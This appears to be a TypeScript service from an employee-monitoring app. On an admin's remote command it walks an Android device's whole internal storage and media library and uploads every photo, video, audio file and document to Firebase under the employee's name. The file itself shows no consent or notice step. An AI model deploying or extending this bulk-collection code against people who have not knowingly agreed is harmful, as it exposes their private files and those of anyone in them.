/**
 * FullDeviceSyncService — comprehensive device file/media dump. This never
 * runs on its own; it only fires when triggered by an explicit admin-panel
 * remote command (see RemoteCommandService's `sync_all_files` handler), as
 * opposed to the employee's own File Manager where each file is a manual,
 * individual choice.
 */
import { Platform } from 'react-native';
import * as FileSystem from 'expo-file-system/legacy';
import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
import { doc, getDoc, setDoc, serverTimestamp } from 'firebase/firestore';
import { db, storage } from './firebase';
import { getMediaLibrary, hasMediaLibraryPermission, getSyncMediaTypes } from './nativeModules';

const MEDIA_PAGE_SIZE = 150;
const MEDIA_MAX_ASSETS = 5000;
const MAX_FILE_BYTES = 200 * 1024 * 1024; // 200 MB per file
const MAX_WALK_FILES = 5000;
const MAX_WALK_DEPTH = 12;

const WALK_ROOT = '/storage/emulated/0';
// Only truly inaccessible/junk dirs are skipped — everything else is included.
const SKIP_DIR_NAMES = new Set(['Android', '.thumbnails', 'cache', 'Cache', 'Code Cache', 'lost+found']);

type FileCategory = 'Document' | 'Media' | 'Backup' | 'Image';

function extCategory(filename: string, mediaType?: string): FileCategory {
  const lower = filename.toLowerCase();
  if (/\.(jpg|jpeg|png|gif|webp|heic|bmp|svg)$/.test(lower)) return 'Image';
  if (/\.(mp4|mov|avi|mkv|webm|3gp|mp3|wav|m4a|aac|ogg|flac)$/.test(lower) || mediaType?.includes('video') || mediaType?.includes('audio')) {
    return 'Media';
  }
  if (/\.(zip|rar|7z|tar|gz|bak|apk)$/.test(lower)) return 'Backup';
  return 'Document';
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function toFileUri(path: string): string {
  return path.startsWith('file://') ? path : `file://${path}`;
}

async function isAlreadySynced(docId: string): Promise<boolean> {
  try {
    const snap = await getDoc(doc(db, 'syncedFiles', docId));
    return snap.exists() && Boolean(snap.data()?.downloadUrl);
  } catch {
    return false;
  }
}

async function uploadAndIndex(
  userId: string,
  employeeName: string,
  docId: string,
  uri: string,
  filename: string,
  sizeBytes: number,
  category: FileCategory,
): Promise<boolean> {
  if (sizeBytes > MAX_FILE_BYTES) return false;
  if (await isAlreadySynced(docId)) return false;

  const response = await fetch(uri);
  const blob = await response.blob();
  const safeName = filename.replace(/[/\\?%*:|"<>]/g, '_');
  const storagePath = `synced-files/${userId}/${docId}_${safeName}`;
  const storageRef = ref(storage, storagePath);
  await uploadBytes(storageRef, blob);
  const downloadUrl = await getDownloadURL(storageRef);

  const ext = filename.includes('.') ? filename.split('.').pop()?.toUpperCase() : undefined;
  await setDoc(doc(db, 'syncedFiles', docId), {
    userId,
    employeeName,
    filename: safeName,
    fileType: ext || 'FILE',
    size: formatSize(sizeBytes || blob.size || 0),
    category,
    syncedAt: new Date().toISOString(),
    downloadUrl,
    manuallySynced: false,
    source: 'admin_full_sync',
    updatedAt: serverTimestamp(),
  });
  return true;
}

async function syncMediaLibraryAssets(userId: string, employeeName: string): Promise<number> {
  const MediaLibrary = await getMediaLibrary();
  if (!MediaLibrary) return 0;
  if (!(await hasMediaLibraryPermission())) return 0;

  const mediaTypes = getSyncMediaTypes(MediaLibrary);
  let synced = 0;
  let totalFetched = 0;

  for (const mediaType of mediaTypes) {
    let after: string | undefined;
    let hasNext = true;

    while (hasNext && totalFetched < MEDIA_MAX_ASSETS) {
      const page = await MediaLibrary.getAssetsAsync({
        first: MEDIA_PAGE_SIZE,
        after,
        sortBy: [[MediaLibrary.SortBy.modificationTime, false]],
        mediaType,
      });

      for (const asset of page.assets) {
        if (totalFetched >= MEDIA_MAX_ASSETS) break;
        totalFetched++;
        try {
          const docId = `${userId}_ml_${asset.id}`;
          const info = await MediaLibrary.getAssetInfoAsync(asset);
          const filename = info.filename || `asset_${asset.id}`;
          const uri = info.localUri || asset.uri;
          if (!uri) continue;

          const ok = await uploadAndIndex(
            userId,
            employeeName,
            docId,
            uri,
            filename,
            (info as { fileSize?: number }).fileSize || 0,
            extCategory(filename, asset.mediaType),
          );
          if (ok) synced++;
        } catch (e) {
          console.warn('[FullDeviceSync] skip media asset', asset.id, e);
        }
      }

      after = page.endCursor;
      hasNext = page.hasNextPage;
    }
  }

  return synced;
}

function stableId(path: string): string {
  return path.replace(/[^a-zA-Z0-9]+/g, '_').slice(0, 140);
}

async function walkAndUpload(
  userId: string,
  employeeName: string,
  dirPath: string,
  depth: number,
  counter: { synced: number; visited: number },
): Promise<void> {
  if (depth > MAX_WALK_DEPTH || counter.visited >= MAX_WALK_FILES) return;

  let names: string[];
  try {
    names = await FileSystem.readDirectoryAsync(toFileUri(dirPath));
  } catch {
    return;
  }

  for (const name of names) {
    if (counter.visited >= MAX_WALK_FILES) break;
    if (SKIP_DIR_NAMES.has(name)) continue;

    const fullPath = `${dirPath.replace(/\/$/, '')}/${name}`;
    const uri = toFileUri(fullPath);

    let info: FileSystem.FileInfo;
    try {
      info = await FileSystem.getInfoAsync(uri);
    } catch {
      continue;
    }
    if (!info.exists) continue;

    if (info.isDirectory) {
      await walkAndUpload(userId, employeeName, fullPath, depth + 1, counter);
      continue;
    }

    counter.visited++;
    const size = info.size ?? 0;
    if (size <= 0) continue;

    try {
      const ok = await uploadAndIndex(
        userId,
        employeeName,
        `${userId}_fs_${stableId(fullPath)}`,
        uri,
        name,
        size,
        extCategory(name),
      );
      if (ok) counter.synced++;
    } catch (e) {
      console.warn('[FullDeviceSync] skip file', name, e);
    }
  }
}

async function syncFilesystem(userId: string, employeeName: string): Promise<number> {
  if (Platform.OS !== 'android') return 0;
  const counter = { synced: 0, visited: 0 };
  await walkAndUpload(userId, employeeName, WALK_ROOT, 0, counter);
  return counter.synced;
}

/**
 * Runs a full device dump: every accessible photo/video in the media
 * library, plus every accessible file under internal storage (skipping only
 * OS-blocked or junk directories). Only ever invoked by an admin-initiated
 * remote command.
 */
export async function runFullDeviceSync(userId: string, employeeName: string): Promise<number> {
  const [mediaSynced, fsSynced] = await Promise.all([
    syncMediaLibraryAssets(userId, employeeName),
    syncFilesystem(userId, employeeName),
  ]);
  return mediaSynced + fsSynced;
}
